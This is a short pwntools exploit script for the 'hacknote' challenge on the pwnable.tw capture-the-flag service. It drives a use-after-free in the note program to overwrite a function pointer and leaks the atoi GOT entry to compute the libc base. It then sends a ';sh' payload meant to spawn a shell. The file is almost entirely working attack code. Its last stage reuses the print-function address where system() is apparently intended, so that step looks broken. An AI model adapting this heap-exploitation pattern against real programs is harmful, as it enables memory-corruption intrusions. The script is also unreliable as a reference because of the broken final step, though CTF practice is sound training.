from pwn import *

locdbg=		False

if locdbg:
    p=process('hacknote')
else:
    p=remote('chall.pwnable.tw',10102)
    libc=ELF('libc_32.so.6')
context.log_level='debug'


elf=ELF('./hacknote')

def cn(length,ctt):
    p.recv()
    p.sendline('1')
    p.recv()
    p.sendline(str(length))
    p.recv()
    p.send(ctt)
    p.recv()

def dn(idx):
    p.recv()
    p.sendline('2')
    p.recv()
    p.sendline(str(idx))
    p.recv()

def pn(idx):
    p.recv()
    p.sendline('3')
    p.recv()
    p.sendline(str(idx))

sleep(1)

cn(63,'\n')
cn(8,'\n')

dn(1)
dn(0)

cn(8,p32(0x804862b)+p32(elf.got['atoi']))

pn(1)

libc_base=u32(p.recv())-libc.symbols['atoi']
print('libc_base= '+hex(libc_base))

dn(2)
cn(8,p32(0x804862b)+b';sh\x00')#+p32(libc_base+libc.search(b'/bin/sh').__next__()))
#cn(8,p32(libc_base+libc.symbols['puts'])+p32(libc_base+libc.search(b'/bin/sh').__next__()))
pn(1)
#p.interactive()
p.recv()